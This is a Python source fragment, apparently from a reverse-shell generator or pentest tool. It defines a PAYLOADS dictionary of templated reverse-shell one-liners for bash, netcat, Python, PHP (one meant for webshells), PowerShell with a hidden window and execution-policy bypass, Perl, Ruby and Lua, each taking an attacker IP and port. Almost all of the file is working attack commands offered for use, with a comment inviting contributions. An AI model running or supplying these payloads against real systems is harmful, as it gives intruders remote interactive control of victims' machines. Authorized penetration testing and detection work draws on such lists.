PAYLOADS = {
    "bash": {
        "description": "Bash TCP reverse shell",
        "cmd": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    },
    "bash-mkfifo": {
        "description": "Bash mkfifo reverse shell (Should be more reliable)",
        "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f",
    },
    "python": {
        "description": "Python 3 reverse shell",
        "cmd": (
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);"
            "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call([\"/bin/bash\",\"-i\"])'"
        ),
    },
    "python2": {
        "description": "Python 2 reverse shell",
        "cmd": (
            "python -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);"
            "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
    },
    "php": {
        "description": "PHP reverse shell (exec)",
        "cmd": 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/bash -i <&3 >&3 2>&3");\'',
    },
    "php-system": {
        "description": "PHP reverse shell (system, use in webshells)",
        "cmd": "<?php system(\"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\"); ?>",
    },
    "nc": {
        "description": "Netcat reverse shell",
        "cmd": "nc -e /bin/bash {ip} {port}",
    },
    "nc-mkfifo": {
        "description": "Netcat reverse shell without -e (busybox/older nc)",
        "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    },
    "powershell": {
        "description": "PowerShell reverse shell (Windows)",
        "cmd": (
            "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            "\"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
            "$stream = $client.GetStream();"
            "[byte[]]$bytes = 0..65535|%%{{0}};"
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            "$sendback = (iex $data 2>&1 | Out-String );"
            "$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';"
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);"
            "$stream.Flush()}};$client.Close()\""
        ),
    },
    "perl": {
        "description": "Perl reverse shell",
        "cmd": (
            "perl -e 'use Socket;$i=\"{ip}\";$p={port};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
            "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}};'"
        ),
    },
    "ruby": {
        "description": "Ruby reverse shell",
        "cmd": (
            "ruby -rsocket -e 'exit if fork;"
            "c=TCPSocket.new(\"{ip}\",{port});"
            "while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"
        ),
    },
    "lua": {
        "description": "Lua reverse shell",
        "cmd": (
            "lua -e \"require('socket');"
            "require('os');"
            "t=socket.tcp();"
            "t:connect('{ip}','{port}');"
            "os.execute('/bin/sh -i <&3 >&3 2>&3')\""
        ),
    },
}
#Most of the payloads have been dumped from google, feel free to contribute more or better ones!